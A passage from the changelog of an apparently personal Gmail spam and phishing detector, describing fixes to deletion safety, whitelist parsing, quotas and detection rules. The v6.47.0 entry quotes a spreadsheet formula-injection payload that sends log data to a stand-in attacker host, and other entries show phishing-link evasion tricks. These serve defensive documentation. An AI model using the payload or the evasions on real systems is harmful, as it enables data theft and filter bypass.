**In the Spam folder, Gmail's verdict is evidence.** Our rules demand two or
more behaviours precisely because on inbox mail they have no prior to lean on.
In the Spam folder they do — Gmail already judged the message. So
`reviewGmailSpam()` is now two phases:

    phase 1  any ONE corroborating signal  -> archive, log, delete NOW
    phase 2  no signal, aged past grace    -> archive, log, delete
             whitelisted                   -> kept, logged, never touched

`hasCorroboratingSignal()` deliberately excludes `bulkEmailService`: virtually
every newsletter the user actually wants is bulk-routed, so it corroborates
nothing.

**Rule 8 — free-mail machine-generated sender + 2+ spam behaviours, no bulk
required.** The same message landing in the INBOX was also missed: measured at
clickbait 1, fear true, Signal 8 true — three independent behaviours and no rule
that does not require bulk infrastructure. Rule 8 closes that. It deletes rather
than quarantines: it is spam, not phishing.

Phase 2 uses a new `isWhitelistedSender()` that reads only `getFrom()`, so
sparing a whitelisted sender costs no extra Gmail fetch.

Disposition assertions 64 -> 68, and the ones that matter are the negative
cases: `jane.doe@gmail.com`, `john1985@gmail.com`, `mike_92@yahoo.com` and
`clark.kent1938@gmail.com` must all fall through to the grace period rather than
being deleted on corroboration. Added an `.eml` fixture for the inbox path.

## v6.51.0

Fix the Spam-folder regression properly, and fix two whitelist parse holes that
made the obvious fix dangerous.

**The reported problem was real.** `get@newsletter.bondlyst.com`,
`crew@your.atlantisinvestors.com` and `raju47326yu@gmail.com` were sitting
undeleted in the Spam folder. v6.46.0 stopped the blanket sweep (correct — it
had been permanently deleting Gmail's false positives, unarchived), and v6.50.0
then required our seven rules to independently agree before deleting. Those
rules are tuned for mail that reached the INBOX and have no sender reputation,
domain age or volume data, so they score most Gmail-caught spam clean. All three
survived. The folder became a junk drawer.

**My first fix was worse and a pre-merge review blocked it.** Inverting the
default — delete unless whitelisted — makes `DEFAULT_DOMAINS.legitimate`, 16
hand-maintained strings, the sole guard on a permanent-delete path. It cannot
enumerate a user's correspondents. Verified against the live code: an ordinary
bank alert, a 2FA mail from a small service and a message from a human
correspondent were all deleted. What it really gave up is Gmail's own 30-day
recovery window — a folder the user can open, search and click "Not spam" in —
in exchange for an EML in Drive named by timestamp and eight hex digits.

**The fix is time, not a cleverer verdict.** `reviewGmailSpam()` now age-gates
in the query: `in:spam older_than:CONFIG.gmailSpamGraceDays`. Default 7 days.
The folder still empties on a rolling basis, Gmail's mistakes keep a real
recovery window, and young mail is never even fetched — so the grace period
costs nothing in quota. Whitelisted senders are never deleted at any age, as
belt-and-braces rather than sole protection.

**Two whitelist parse holes, both verified, both now fixed.** Each was harmless
while the consequence was "stays in Spam" and would have been data loss the
moment anything deleted on a failed whitelist match:

- `extractEmailAddress()` only understood `<addr>`, so RFC 2822's comment form
  `notifications@linkedin.com (LinkedIn)` returned the whole string and derived
  a host of `linkedin.com (linkedin)` — a **whitelisted sender failing the
  whitelist check**.
- From was truncated to `maxFromChars` *before* the address was extracted, so a
  display name over 500 characters cut the address away entirely. Now the
  address is taken from the untruncated header and only the pattern-matching
  copy is truncated.

**Leaks the review also caught, all fixed.** Every non-deleting branch now calls
`markReviewed()`, so no message is re-fetched cycle after cycle — the failure
this project has shipped twice. New `deleteMessagePermanently()` reports whether
the delete actually happened, because `markAsSpam()` deliberately falls back to
`thread.moveToSpam()` when the Advanced Service is missing, which previously
incremented the deleted counter while the message survived and was re-archived
to Drive every five minutes. `REVIEW_LIMIT` stays at 20; the age gate collapses
per-cycle volume, so the execution-budget concern that justified raising it
disappears.

Also: `bondlyst.com` and `atlantisinvestors.com` blacklisted, with `.eml`
fixtures — both now fire **Rule 1** on the inbox path, so the blacklist entries
are load-bearing rather than decorative. `raju47326yu@gmail.com` cannot be
blacklisted (`gmail.com`) and relies on the age gate, which is exactly why the
gate rather than a domain list is the fix.

Disposition assertions 45 -> 64, covering the age gate, all four whitelist
header forms, and every non-deleting branch marking the thread. Two of them
caught real bugs in this change: the grace constant was added to `LIMITS` while
the code read `CONFIG`, producing `older_than:undefinedd`, and an assertion that
compared the query against the same undefined expression passed anyway.

## v6.50.3

Actually apply the `docs/BACKLOG.md` update that v6.50.2 claimed to make.

The v6.50.2 patch script aborted on a bad function call before writing the file,
but the version bump, the changelog entry and the push all went ahead — so
v6.50.2 shipped a changelog asserting the backlog had been brought current when
it had not been touched. The claim, not the code, was the defect.

The backlog now genuinely carries: the corrected "as of" version, a **Where to
pick up** section (commands to run, first concrete action, the two behaviours
that want observing, and the note that `BLOG.md` and `SESSION_REPORT.md` are
gitignored), a **Settled — do not re-litigate** section recording the four
disposition decisions with their reasoning, and `reviewGmailSpam()` added to the
list of unlocked destructive entry points.

Worth recording as its own lesson: a patch script that fails partway leaves the
commit describing an intent rather than a result. `validate.py` catches version
and count drift but cannot catch a changelog entry that is simply untrue.

Documentation only.

## v6.50.2

Bring `docs/BACKLOG.md` current. It was written at v6.49.0 and did not know
about `reviewGmailSpam()`, so its list of unlocked destructive entry points was
incomplete and its Spam-folder reasoning was a release out of date.

Added a **Where to pick up** section — the commands to run, the first concrete
action and why, the two new behaviours that need observing before more changes
land, and a note that `BLOG.md` and `tests/SESSION_REPORT.md` are gitignored and
will not survive a clone.

Added a **Settled — do not re-litigate** section recording the four disposition
decisions made on 2026-09-16 with their reasoning, so a future reader does not
reopen them from scratch.

Documentation only.

## v6.50.1

Close a quota leak introduced one release earlier. `reviewGmailSpam()` left
messages it disagreed about with no marker, so they matched
`in:spam -label:SpamDetectorPurge` again on the very next cycle and were
re-evaluated every five minutes indefinitely — 20 threads x 2 Gmail reads x 288
cycles is roughly 11,500 reads a day spent recomputing answers already reached,
against a ~20,000 daily ceiling. Quota exhaustion stops detection entirely, so
this was a self-inflicted outage risk.

Reviewed-and-left messages now get `CONFIG.processedLabel`, and the query
excludes it. The message itself is untouched: still in Spam, unmoved,
undeleted — only the thread label changes.

This is the same failure the day kept producing: a decision made and then not
recorded, so the system recomputes it forever. Two assertions now cover it.

## v6.50.0

Re-judge Gmail's own spam verdicts instead of ignoring them.

v6.46.0 scoped `destroySpam()` to messages this detector itself condemned,
because the blanket sweep was permanently deleting Gmail's false positives
within minutes — unarchived, unlogged, no Trash. That fixed the data loss but
left Gmail-classified spam piling up in a folder the user then has to police by
hand. It traded one bad outcome for a worse experience, and the binary was a
false one.

New `reviewGmailSpam()` runs the seven rules over mail Gmail filed and acts only
on agreement:

    we agree it is spam  ->  archive to Drive, log it, delete it
    anything else        ->  leave it exactly where it is

"Anything else" includes every whitelisted sender, which is the case that
matters. `collectSignals()` returns null for a whitelisted sender, so a LinkedIn
notification Gmail misfiled is never touched — under the old blanket sweep it was
destroyed with no trace.

Deliberately does **not** move anything back to the inbox. Rescuing a false
positive has its own failure mode (a wrong whitelist entry would re-deliver real
spam) and mail reappearing unasked is its own surprise.

Logged as `GMAIL_SPAM_CONFIRMED` rather than `SPAM_DETECTED`, so the training set
can distinguish "we caught this in the inbox" from "Gmail caught it and we
concurred" — different detection events, both genuinely spam.

Scoped by Gmail search (`in:spam -label:SpamDetectorPurge`) rather than label
intersection, because `analyzeMessage()` needs GmailMessage objects that the REST
`list()` does not return. The negative label term is index-dependent, but the
failure mode is benign: a lagging index re-evaluates a message already condemned,
which the sweep would have deleted anyway.

Five disposition assertions cover it, including that a whitelisted sender is
neither deleted nor archived, that the query excludes our own purge label, and
that nothing is ever moved back to the inbox.

Also fixed the test harness itself: the fake messages lacked `getThread()`,
`getReplyTo()` and `getHeader()`, and the stub lacked `Utilities.newBlob()`, so
`accumulateLogEntry()` threw and the archive invariant refused every delete. The
invariant was working; the harness was lying about why. And two Python docstrings
containing `\s` now use raw strings, clearing a SyntaxWarning.

## v6.49.1

Added `docs/BACKLOG.md`: the deferred work from both external reviews, tiered,
with a *why it can wait* and *what would escalate it* for each item — the second
being the part that actually ages well. Also records the known-and-accepted
Signal 7 evasions so they are not rediscovered as bugs, and the four ideas
deliberately rejected.

Documentation only; no behaviour change.

## v6.49.0

Close two zero-cost Signal 7 bypasses, and move this changelog out of the source
header.

**Quote-aware tag scanning.** The open-tag regex `/<a\s[^>]*>/` stopped at the
first `>`, including one inside a quoted attribute value, so
`<a title=">" href="https://evil.com/">VIEW IN DOCUSIGN</a>` lost its href
entirely: the "tag" ended at the title's `>`, contained no href, and the scan
resumed past the real one. Every mail client renders and navigates that anchor
normally. Replaced with `findTagEnd()`, a bounded character walk that tracks
quote state — linear, no backtracking.

**HTML5 slash separator.** `<a/href="...">` was invisible because the scanner
required whitespace after `<a`, and the attribute matcher required whitespace
before the name. `/` is a valid attribute separator and clients navigate it
fine. Cost to evade: one character.

**Accessible-name attributes.** An image CTA defeated Signal 7 completely:
`<a href="https://evil.com/"><img alt="View in DocuSign"></a>` has no text node
at all, so the tag-stripper produced an empty string. This is not exotic — an
image button is what real phishing already uses, because it renders identically
and dodges text scanners. `extractAttributeValues()` now harvests `alt`,
`title` and `aria-label` from the anchor's own tag and anything nested inside
it, and they are matched alongside visible text. A mail client shows the user
"View in DocuSign"; now so does the detector.

New `LIMITS.maxAnchorTagChars` (4000) bounds the tag scan. Measured: a 200KB
unterminated tag and 100,000 quoted `>` characters each complete in under a
millisecond.

**Changelog moved to CHANGELOG.md.** It had reached 459 lines — 11% of the
source — and was actively misleading rather than merely long: the v6.42.0,
v6.44.0 and v6.46.0 entries described three incompatible designs for
`destroySpam()` and `quarantineAsPhishing()` as if all were current, with
nothing marking which was live. The header now carries only the current
contract and is 41 lines. `scripts/validate.py` check 2 moved with it and now
also asserts entries are newest-first.

## v6.48.2

Stop buffering raw message content. Completes the v6.47.0 memory fix, which was only half done: archiveRawEml() writes the EML to Drive synchronously, so nothing reads entry.rawContent again, yet it was still stored on every buffered log entry. That held up to CONFIG.maxEmailsPerRun full raw messages in memory until the flush — 50 x potentially 25MB, because getRawContent() is not bounded by CONFIG.maxEmailSizeBytes (that guard reads getBody()). The buffer now holds only the small Sheets row.

## v6.48.1

Remove the unused script.external_request OAuth scope. Nothing in this file has ever called UrlFetchApp — verified zero references — so the one scope that grants outbound network access was pure downside. Without it, code running in this project can read and delete mail but cannot send it anywhere: destruction is possible, exfiltration is not. NOTE: narrowing a manifest does NOT prompt for re-consent, because the script is asking for a subset of what was already granted. The previously granted token stays broader until the user revokes access at myaccount.google.com and re-approves. Until then this change is declarative only. gmail.modify and gmail.labels are deliberately left in place: both are strict subsets of mail.google.com, which is required because gmail.modify cannot permanently delete. Removing them would change nothing but the consent screen wording, at some risk.

## v6.48.0

recheckRecentSpamChecked() holds for review instead of deleting. This path re-judges mail the user has ALREADY READ AND KEPT, and it is forced to run within a minute of every deploy. Until now it called disposeDetectedMessage(), so a newly deployed pattern permanently deleted up to 20 such messages immediately, with nothing between a new regex and the loss but a 22-file ham corpus. It was the highest-blast-radius consequence of a bad pattern in the system and the one most likely to be exercised, because a pattern is added precisely when it is new and unproven. New holdForReview() archives the message out of the inbox and labels it CONFIG.reviewLabel. The inbox still gets cleaned and the recheck query (scoped to in:inbox) will not see it again, but nothing is destroyed. No SPAM label is applied, so destroySpam() can never reach it either. The same reasoning that gave Rule 7 a quarantine applies with more force here: on the day a pattern changes, every rule has an unproven false-positive class. checkFalseNegatives() still deletes, and that asymmetry is deliberate — a manual SpamMissed label is the user ASKING for destruction, whereas the recheck is the script overruling a decision the user already made. Also centralised the review label as CONFIG.reviewLabel (it was hardcoded in four places) and added seven disposition assertions covering the hold path.

## v6.47.1

Documentation accuracy pass. No behaviour change. docs/index.html is the published GitHub Pages site and was stale on nearly everything: six rules instead of seven (so it stated that every detection is permanently deleted), a reportSpam() function that does not exist, a feature vector in which not one field name was real, three different wrong ham counts, a claim that Gmail's Spam folder never auto-clears used to justify behaviour since removed, an assertion that GitHub/Stripe/PayPal/banks ship whitelisted when they do not, and a description of the folder-wide sweep as a safety feature. All corrected, Rule 7 and the quarantine documented, and the real nine-field signal object published for the ML dataset section. README: signal list said 6 in one place and 8 in another against 9 in code; rule list said 4 against 7; "~120 lines of detection logic" was off by 3x; the Vaporizer section still promised everything is deleted. Added a labels table — five labels appear in the sidebar and the docs named two. docs/SPAM_LOGGING_PLAN.md marked as shipped rather than "approved for implementation", with the schema enum and rule range corrected. docs/EXPORTING_EMAILS.md lost the completed PDF-to-.eml migration instructions and gained a section on actually adding a fixture to the corpus.

## v6.47.0

Security hardening after an external review declined sign-off. Six findings, all verified by running the shipped code.

(1) ARCHIVE-BEFORE-DELETE WAS NOT REAL. Four comments asserted it; none were true. accumulateLogEntry() only buffered, and the Drive write happened in flushSpamLog() AFTER the thread loop, so the actual order was batchDelete then archive. A 6-minute timeout, an unset SPAM_LOG_FOLDER_ID, a memory kill or a throw from maintenance each destroyed mail with no copy, and the buffer is cleared in a finally so nothing carried over. The recovery story the v6.44.0 post-mortem relied on did not exist. New archiveRawEml() writes the EML synchronously and reports success; disposeDetectedMessage() now REFUSES the destructive branch without it and holds the message for review instead. The invariant is enforced in code and asserted in tests rather than described in comments.

(2) SHEETS FORMULA INJECTION. setValues() evaluates formulas — the code depends on that for its =HYPERLINK column — and the Subject, display name, address and Reply-To were written raw. A subject of =IMPORTXML("https://attacker/?x="&ENCODEURL(JOIN(",",A2:R500))) fires on document open in the user's authenticated session and exfiltrates the whole detection log. New escapeSheetCell() apostrophe-prefixes anything starting with = + - @ tab or CR, and caps cell length: an over-long subject used to make setValues() throw, discarding the log rows for an entire batch of already-deleted mail.

(3) QUADRATIC REGEX DoS. Fifteen patterns have the shape X.*Y, which backtracks quadratically when X matches often. Measured: a 100KB subject of "Trump " cost 3.5s, and 200KB across subject+from cost 14s — one email blowing the 6-minute budget, killing the run before threads are labelled so the next trigger repeats it forever, a self-sustaining denial of detection. The 100 000-char cap bounded nothing useful. Added maxSubjectChars

(2000) and maxFromChars (500). The ReDoS analysis comment was wrong and said so confidently; corrected.

(4) OVERSIZE-BODY BYPASS. A body over maxEmailSizeBytes was skipped unevaluated and then stamped SpamChecked, so padding the HTML defeated all seven rules at zero cost and the message was never reconsidered. Such threads are now flagged SuspectedSpam.

(5) WHITESPACE PLAIN PART. A text/plain body of one space is truthy, so the HTML fallback never ran and Signals 2b, 2c and 2d all saw an empty body. One space disabled every body signal. Fixed with .trim().

(6) cleanseInbox() still had the substring whitelist/blacklist matcher that v6.42.0 fixed in collectSignals() only — and matched the DISPLAY NAME, so "Dragonfly Capital" was whitelisted and "FinanceBuzz Weekly" from a legitimate domain was permanently deleted, with no archive at all. It hand-rolled the pipeline and then called analyzeMessage() anyway; the duplicate is deleted and it now shares one code path. Also: isBulkEmail() scans the first 64KB rather than lowercasing a 25MB message; checkFalseNegatives() gained the result cap every other search already had, and honours the archive invariant; removed dead refreshWhitelist/refreshBlacklist (77 lines, obsolete since v6.35.0) and the dead phishing-label block in destroySpam(); corrected four factually wrong comments; scripts/validate.py is wired into CI and its broken README-tag check replaced with an @version/SCRIPT_VERSION agreement check; CI path filters now include scripts/, .claspignore and docs/ — the files that broke four deploys did not trigger the workflow.

## v6.46.0

Scope the spam sweep to this detector's own verdicts. destroySpam() deleted the ENTIRE Spam folder every few minutes — including mail Gmail's classifier filed, which this script never evaluated. That path calls neither accumulateLogEntry() nor the Drive archiver, so a Gmail false positive was destroyed permanently, unlogged and unrecoverable, within minutes. The docstring described clearing "pre-existing spam" as a feature; it was the largest irreversible data-loss path in the system by volume, and v6.44.0 shrank the window from 15 to 5 minutes without recognising that. markAsSpam() now tags each message with CONFIG.purgeLabel in the same modify() call that reports it as spam, before attempting the delete, and destroySpam() lists the label INTERSECTION ['SPAM', purgeLabel]. Deliberately an intersection rather than a q: filter: a q: reads the eventually-consistent search index, and an index-lagged query is what destroyed a quarantined message on 2026-09-16. If the tag is index-lagged the message is simply not swept this cycle — a delayed delete, not a premature one. If the label cannot be resolved at all the sweep runs on NOTHING rather than falling back to emptying the folder. Gmail purges its own Spam at 30 days, so the folder still gets cleared; the difference is that the user can now reach into it. New purgeAllSpamNow() keeps the empty-the-folder capability as a deliberate manual action rather than a background sweep. New getLabelId() resolves a label name to the REST API id (GmailApp label objects do not expose it), cached per execution. tests/test_disposition.js grew to 25 assertions: the tag is applied before the delete and in one call, our verdict IS swept, Gmail-classified spam is NOT, the scope is a label intersection with no q: filter, and the sweep refuses to run if the label cannot be resolved.

## v6.45.3

Stop clasp uploading Node test scripts. clasp treats ANY .js under rootDir as Apps Script source, and .claspignore's bare "*.js" matches only top-level files, so adding scripts/patch_version.js broke the deploy with "ParseError: Unexpected token ILLEGAL ... file: scripts/patch_version.gs". Added a scripts directory glob and a recursive .js glob (the latter cannot be written literally here — it would close this comment block). tests/test_patch_version.js now walks the repo for .js files and asserts each is excluded, so a future Node helper cannot break the deploy the same way.

## v6.45.2

Guard version extraction in the deploy workflow. grep -oP prints every match on its own line, so a commit subject naming two versions produced a multi-line $VERSION and broke the deploy. patch_version.js rejected it loudly; the sed it replaced would have mangled the source silently. head -n1 applied at all three extraction sites (patch, validate, tag). Keep commit subjects to one version string regardless.

## v6.45.1

Fix the deploy step that blocked v6.45.0. The anchored @version sed added in v6.43.0 had to survive YAML block-scalar, shell double-quote and sed-expression quoting at once; it parsed on BSD sed locally and failed on GNU sed in CI with "unterminated `s' command", after the test job had already gone green. So v6.45.0's code was never deployed. Replaced by scripts/patch_version.js, covered by tests/test_patch_version.js in the test job, so a broken version patch now fails tests rather than the deploy.

## v6.45.0

Hardening pass on v6.42.0-v6.44.0 after external review. Six defects, four of them verified by running the live code:

(1) Quarantine was not terminal. processInbox() skipped the SpamChecked label whenever spamCount > 0, an invariant that meant "thread was deleted" until Rule 7 started leaving threads alive. A quarantined thread still holding INBOX (a reply-chain lure leaves a sibling there, or the user un-archives it) was re-detected every minute: ~1440 PHISHING_DETECTED rows and Drive EMLs per day, corrupting the detection log that exists to train a model. processThread() now reports `destroyed` explicitly, quarantine applies processedLabel, and both search queries exclude phishingLabel.

(2) addressMatchesDomain()'s substring fallback matched the LOCAL PART, which is attacker-chosen: dragonfly@attacker.tld was

WHITELISTED (a free bypass of the whole detector, from a list published in this repo) and financebuzz@realcompany.com was

BLACKLISTED, i.e. Rule 1, i.e. permanently deleted. Nine blacklist entries have no dot, so the delete path was broadly exposed. Fallback now tests the host only, and '@' entries must end on a domain-label boundary.

(3) 'signnow' removed from BRAND_CTA_DOMAINS. Anchor text is normalized by stripping non-alphanumerics, so the ordinary button label "Sign Now" collapsed to "signnow" and fired Rule 7 on legitimate Ironclad and BambooHR buttons.

(4) TRACKER_LABELS was a one-CNAME bypass: r.evil.com or click.evil.com made Signal 7 abstain regardless of who owned the parent domain. The original Capital B lure would have escaped for the cost of one DNS record. The label heuristic now requires the parent to be sender-aligned, which is the only shape it actually models; third-party ESP trackers still match by domain.

(5) The 60-char CTA cap measured raw text, so zero-width padding (JS \s does not match U+200B) and plain verbosity both evaded it — a natural 67-char label was invisible. Now measured on the normalized alphanumeric text at 80.

(6) hasBrandMismatchedCta() received the sanitizeInput()-truncated body, capping HTML at 100 000 chars. That made LIMITS.maxHtmlScanChars dead config and hid any CTA past 100KB, which real marketing HTML with inlined CSS routinely exceeds. It now gets the untruncated body; extractAnchors() is independently bounded, which was the point of those limits. Also: disposeDetectedMessage() allowlists the destructive branch instead of defaulting to it, so an unidentifiable verdict quarantines rather than deletes; _quarantinedThisRun (which disabled the entire spam sweep for a whole execution) replaced by per-id exclusion; recheckRecentSpamChecked() gated on version change plus a 30-minute floor rather than the 5-minute timer, since its trigger is a pattern change, not the clock. New tests/test_disposition.js — 18 assertions, wired into CI — is the first automated coverage of the code that irreversibly deletes mail, and regression-tests both the 2026-09-16 incident and the re-quarantine loop.

## v6.44.0

CRITICAL FIX — a quarantined phishing message was permanently deleted. On 2026-09-16 Rule 7 correctly caught "Capital B | Bitcoin Policy Brief" and quarantined it, logging PHISHING_DETECTED with signals BULK,BRAND_MISMATCH_CTA. Within the SAME execution, destroySpam() then batch-deleted it. Cause: quarantine moved the message to SPAM and relied on destroySpam()'s "-label:Phishing" query to spare it. That query reads Gmail's SEARCH INDEX, which is eventually consistent. The Phishing label had been applied seconds earlier, the index did not reflect it yet, and the message was swept. v6.43.0 made this certain rather than merely possible by forcing the maintenance cycle in the same execution as detection. Fix is structural, not a better query: quarantine no longer applies the SPAM label at all. It archives (removes INBOX) and labels. destroySpam() lists labelIds:['SPAM'], so a message that never carries that label cannot be swept regardless of index state — the race is gone by construction rather than narrowed. Cost: Gmail's classifier no longer learns from Rule 7 hits. That is the right trade — Rule 7 is the one rule with an irreducible false-positive class, and not destroying mail outranks filter training. Rules 1-6 still report to SPAM and still delete. Added _quarantinedThisRun as a safety interlock so any future change that reintroduces a SPAM move cannot silently recreate the race. Also reduced the maintenance interval from 15 to 5 minutes (quota math in runPeriodicMaintenance). The deleted message was recoverable: v6.32.0 archives the raw EML to Drive BEFORE deletion, which is the only reason this was a recoverable incident rather than permanent data loss.

## v6.43.0

Restore prompt post-deploy recatch. v6.36.0 promised that a fix deploy cleans up after itself unattended, and before v6.40.0 it did: recheckRecentSpamChecked() ran on every 1-minute invocation, so a newly-deployed pattern re-caught its target within about a minute. v6.40.0 moved maintenance behind a 15-minute gate for performance and silently made that up to 15x slower, which is why a freshly deployed fix appears to do nothing for a quarter hour. runPeriodicMaintenance() now forces one immediate cycle when SCRIPT_VERSION differs from the last version recorded in Script Properties. Once per deploy, not once per minute, so the v6.40.0 performance win is kept. LAST_SEEN_VERSION is written BEFORE the cycle runs so a throwing maintenance function cannot force a fresh cycle every minute and burn Gmail API quota. Chosen over a CI step that calls the Apps Script Execution API: no manifest executionApi block, no API-executable deployment, no extra OAuth scopes, and it also covers deploys made outside CI (manual clasp push, or an edit in the Apps Script editor). SCRIPT_VERSION is patched by the deploy workflow in its own sed, separate from the header tag, and verified by grep so a silent patch failure fails the deploy rather than disabling detection.

## v6.42.0

Catch brand-mismatched CTA phishing — the first signal that reads the LINK GRAPH instead of sender-side vocabulary. Missed email: "Capital B | Bitcoin Policy Brief" from info@cptlbnews.press (a cousin of the real cptlb.com), sent via Resend over Amazon SES. It scored ZERO on all eight existing signals except bulk — no clickbait, no fear, no Unicode obfuscation, valid SPF+DKIM for its own domain, a real corporate footer with a real Euronext ticker, and hedged modal prose throughout ("a reported 7-10% withholding provision ... could apply"). Not a threshold miss; a total signal vacuum. The only evidence in the message was its links: a button reading "VIEW IN DOCUSIGN" pointing at cptlbpolicy.com. Added: (1) Signal 7 / Rule 7 — hasBrandMismatchedCta() fires when anchor text names a BRAND_CTA_DOMAINS key, carries a CTA verb and normalizes to <=80 chars (a button label, not prose), while the href host belongs to neither that brand, a known link wrapper, nor the sender. Not gated on bulk — this class also arrives via compromised accounts, the same reasoning Rule 6 accepted.

(2) LINK_WRAPPER_DOMAINS + TRACKER_LABELS — the signal ABSTAINS on click-trackers and CNAMEd trackers. A wrapped destination is unverifiable, not malicious. This abstention is load-bearing: ablation shows that without it, a legitimate SendGrid-tracked invoice with a "View in DocuSign" button false-positives.

(3) extractUrlHost() / hostMatchesDomain() — host parsing that resists the docusign.net.evil.com suffix bug, the notdocusign.net prefix bug, and the docusign.net@evil.com userinfo trick.

(4) decodeHtmlEntities() and nested-tag stripping, so "D&#111;cu&shy;Sign" and "<span>Docu</span><span>Sign</span>" still match. Entity decoding is load-bearing, not cosmetic.

SECURITY FIX (unrelated to the miss, found while reviewing the same function): whitelist and blacklist matching used substring comparison, so "mail@linkedin.com.secure-login.top" and "a@notlinkedin.com" were WHITELISTED and skipped all detection. Now addressMatchesDomain() — exact or dot-suffix. Rule 7 QUARANTINES rather than deletes: reported to Gmail as spam and labelled "Phishing", but no batchDelete, so it stays recoverable. destroySpam()'s sweep excludes that label — without that exclusion the quarantine would be silently destroyed within one 15-minute maintenance cycle. Routing lives in disposeDetectedMessage() so processThread() and recheckRecentSpamChecked() cannot drift; checkFalseNegatives() deliberately still deletes, because a manual "SpamMissed" label is an explicit human instruction. Also: truncate before stripHtmlTags() rather than after (was running two regex passes over up to 5MB); add serviceImpersonation and brandMismatchedCta to debugWhyFlagged(), which has under- reported since v6.38.0; log Rule 7 as PHISHING_DETECTED.

## v6.41.0

Catch hardware-wallet phishing missed via legit SurveyMonkey sending infra ("🔐 System Configuration Notice" template). Three additions: (1) 🔐 added to clickbait emoji cluster — phishing "security notice" decoration that legit 2FA/security mail (Google, Apple, GitHub) does not lead with. (2) Two new BODY_CRYPTO_PATTERNS: \bhardware wallet\b and a tight wallet/firmware "manual update" phrase (deliberately excludes "device" to avoid FP on legit Apple/ IT iOS-update mail). (3) New BODY_FEAR_PATTERNS array (Signal 2c) for phishing-specific conditional-fear body phrases — "your access could be compromised". Legit security alerts use definitive past tense ("was compromised"); conditional future ("could be") is the phishing tell. Each match increments clickbaitCount. Together fire Rule 4 (3+ clickbait) regardless of whether SurveyMonkey infra is bulk-detected. Added ham FP guards: Apple iOS update notice + Google 2FA setup (subject decorated with 🔐).

## v6.40.0

Performance overhaul for 1-minute trigger intervals. Five changes:

(1) Fast-path exit — processInbox() returns after a single GmailApp.search() when no threads are found; no label lookup, no body fetches, no maintenance. (2) Periodic maintenance — checkFalseNegatives(), recheckRecentSpamChecked(), and destroySpam() run at most every 15 min via a Script Properties timestamp instead of every invocation. (3) getMessagesForThreads() batching — N thread.getMessages() calls collapsed to 1 batched API call in processInbox() and recheckRecentSpamChecked().

(4) Whitelist-first in collectSignals() — sender whitelist checked immediately after getFrom(), skipping getRawContent() for known- good senders. (5) Domain list caching — getWhitelist()/getBlacklist() called once per execution via _cachedWhitelist/_cachedBlacklist.

## v6.39.0

Catch political-financial scam miss (economicrulebook.com). Add iterable.com to BULK_EMAIL_FINGERPRINTS (Iterable marketing platform). Add two clickbait patterns: political-looting narrative ("ripped off", "looted", "robbed", "bilked") and payback/revenge framing ("payback time", "now it's time"). Blacklist economicrulebook.com. Together these fire Rule 2 (bulk + 2 clickbait) and Rule 1 (bulk + blacklist) on "America Was Ripped Off for 50 Years – Now It's Payback Time" class emails. Also add BODY_UNICODE_PATTERNS — Cyrillic/Greek/fullwidth/math-alphanumeric check against the email body (Signal 2d). Previously these Unicode obfuscation patterns only fired on subject+from; spammers evade that by embedding obfuscated text in HTML body anchors.

## v6.38.1

Fix logging for Rule 6. getRuleFromSignals() and buildSignalsCsv() were not updated when Rule 6 was added — phishing emails logged Rule=NONE, empty signals, and Log Type=SPAM_DETECTED. Now logs Rule 6, SERVICE_IMPERSONATION in signals, and PHISHING_DETECTED as the log type so phishing rows are visually distinct.

## v6.38.0

Rule 6 — service impersonation phishing detection. Adds IMPERSONATION_SUBJECT_PATTERNS (cloud service share notification subjects) and CLOUD_SERVICE_DOMAINS (trusted sender domains). Emails whose subject matches a known cloud service notification template (e.g. "Document shared with you") but whose sender is not from the expected service domain are classified as phishing without requiring bulk email infrastructure — compromised legitimate accounts are the typical delivery vector.

## v6.37.0

Three operational fixes. (1) Lock-skip log visibility: logDebug → logInfo so a blocked manual trigger shows "Skipping run — previous execution still in progress" instead of silence. (2) Mailchimp bulk detection: add mcsv.net to BULK_EMAIL_FINGERPRINTS so Mailchimp- routed spam is recognised as bulk email. (3) Military pattern: extend to attacks?|attacking so "-ing" verb forms fire the clickbait signal.

## v6.36.0

Auto-recheck false negatives — recheckRecentSpamChecked() runs at the end of every processInbox() trigger cycle. Re-evaluates inbox emails carrying SpamChecked from the last 2 days against current patterns. Any that now score as spam are logged FALSE_NEGATIVE and deleted automatically — no manual SpamMissed labeling needed after a fix deploy.

## v6.35.0

Catch health/political spam miss (finrisex.com). Blacklist finrisex.com. Whitelist conservativebc.ca. Add MAHA to celebrity pattern + "report" as a trailing verb. Expand STOP imperative to include "putting/eating/ drinking". Add suppression conspiracy pattern ("watch before this gets buried"). Fix domain-list architecture: getBlacklist()/getWhitelist() now merge DEFAULT_DOMAINS directly at runtime so new source-code entries are live immediately after deploy — no manual refreshBlacklist() / refreshWhitelist() call needed ever again.

## v6.34.0

Add LockService guard to processInbox() — prevents overlapping executions when a run takes longer than the trigger interval. tryLock(0) skips (rather than queues) concurrent invocations.

## v6.33.0

Remove fixSheetHyperlinks() — one-time migration utility, already run. Dead code.

## v6.32.0

Spam intelligence logging — every detected spam is archived as a raw EML in Google Drive (Spam Intelligence/Detected/) and logged as a structured row in a Google Sheets spreadsheet (19 cols: timestamp, log type, IDs, Drive URL, sender info, rule fired, signals, and manual notes columns). False negatives supported via "SpamMissed" Gmail label — user labels escaped spam, next run logs and deletes it, populating a FALSE_NEGATIVE row. New functions: setupLogging() (one-time setup), checkFalseNegatives(), accumulateLogEntry(), flushSpamLog(), getOrCreateLogSubfolder(), getRuleFromSignals(), buildSignalsCsv(). Logging is fully non-blocking — any Drive/Sheets failure is caught and logged without affecting spam deletion. New OAuth scopes: drive, spreadsheets. Run setupLogging() once after deploy to authorize.

## v6.31.0

Blacklist 1stamericanpath.com (Pre-IPO investment spam mill). Fix stock price pattern to also match $X/share (slash separator).

## v6.30.0

Blacklist morningstockadviser. Add income-opportunity clickbait pattern (second/passive/extra/side income).

## v6.29.0

Security hardening — fix display-name spoofing bypass (whitelist/ blacklist now match against extracted email address only, not full From string). Add stripHtmlTags() HTML body fallback so BODY_CRYPTO_PATTERNS fire on HTML-only emails. Add Phase 5 edge case tests, Phase 6 performance benchmark, ReDoS analysis comment. Pin clasp@3.3.0 in CI. Delete stale archive/.

## v6.28.0

Catch homoglyph-obfuscated health spam (frontiercapitalreport.com). Add Unicode homoglyph pattern to CLICKBAIT_PATTERNS.

## v6.27.0

Comment pass + README/CI fixes for 1st-year CS student clarity.

## v6.26.0

Harden test parser — state machine bracket tracking, flag validation, pattern count cross-checks, parser self-tests.

## v6.25.0

Option B — test suite parses SpamDetector.gs directly (single source of truth). Tests extract all patterns at import time; no pattern duplication between source and tests.

## v6.24.0

